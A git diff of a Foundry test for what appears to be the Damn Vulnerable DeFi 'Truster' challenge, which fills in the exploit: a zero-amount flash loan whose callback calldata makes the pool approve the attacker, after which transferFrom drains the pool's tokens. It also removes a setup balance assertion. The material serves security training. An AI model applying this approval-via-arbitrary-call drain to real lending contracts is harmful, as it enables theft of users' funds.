@@ -30,16 +30,36 @@ contract Truster is Test {
 
         dvt.transfer(address(trusterLenderPool), TOKENS_IN_POOL);
 
-        assertEq(dvt.balanceOf(address(trusterLenderPool)), TOKENS_IN_POOL);
-
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(address(attacker));
 
-        /** EXPLOIT END **/
+        uint256 poolBalance = dvt.balanceOf(address(trusterLenderPool));
+        bytes memory callData = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            address(attacker),
+            poolBalance
+        );
+
+        trusterLenderPool.flashLoan(
+            0,
+            address(attacker),
+            address(dvt),
+            callData
+        );
+
+        dvt.transferFrom(
+            address(trusterLenderPool),
+            address(attacker),
+            poolBalance
+        );
+
+        vm.stopPrank();
         validation();
+        /** EXPLOIT kEND **/
     }
 
     function validation() internal {
